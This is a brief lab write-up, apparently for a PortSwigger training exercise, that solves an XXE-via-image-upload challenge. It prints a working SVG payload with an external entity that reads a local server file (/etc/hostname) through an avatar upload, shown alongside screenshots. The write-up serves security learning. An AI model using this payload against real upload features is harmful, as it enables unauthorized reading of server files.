## Exploiting XXE via image file upload

## Solution

The image upload functionality is vulnerable to XXE attack.

Since SVG image formats are XML based, we can try to upload an SVG image & modify the content of the xml to retreive /etc/passwd.

<img width="1433" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/89fa05c4-a49d-4c69-a54e-a340f5faaf2e">

In the above request remove all the tag contents and replace it with this payload.


<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>


<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/70080467-05b4-4b97-8e3d-837b0c6dfc71">


We get a 302 Redirect which means the file upload is successful.

We can see the image has been uploaded as avatar

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/5674d0e4-bbef-496a-ba5c-8cf2868ff8be">

Use the "Submit solution" button to submit the value of the server hostname.

<img width="1433" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/67fb1de2-a6fe-491c-8fbf-1188e11a714b">
